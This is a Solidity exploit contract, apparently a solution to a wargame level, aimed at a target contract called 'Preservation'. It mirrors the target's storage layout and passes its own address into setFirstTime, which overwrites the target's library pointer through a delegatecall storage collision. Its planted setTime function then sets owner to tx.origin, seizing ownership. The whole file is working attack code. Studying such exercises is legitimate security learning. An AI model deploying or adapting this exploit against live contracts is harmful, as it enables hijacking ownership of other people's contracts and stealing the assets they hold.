pragma solidity ^0.6.0;

interface PreservationInterface {
    function setFirstTime(uint _timeStamp) external;
}

contract LibraryContract {
    // State variable storage is the same as our target contract
    address public fillerAddress1;
    address public fillerAddress2;
    address public owner;
    uint storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    
    // Replaces a libraryContract address with the address of this contract
    function attackPreservation(address _targetAddress) public {
        // Set up the interface
        PreservationInterface pr = PreservationInterface(_targetAddress);
        // Get the address of this contract and turn it into a type that will be accepted by setFirstTime()
        uint256 thisAddressUint = uint256(uint160(address(this)));
        // Call the vulnerable function
        pr.setFirstTime(thisAddressUint);
    }
    
    // Our function which will be called by `Preservation` via a delegatecall
    function setTime(uint _timeStamp) public {
        owner = address(tx.origin);
    }
}
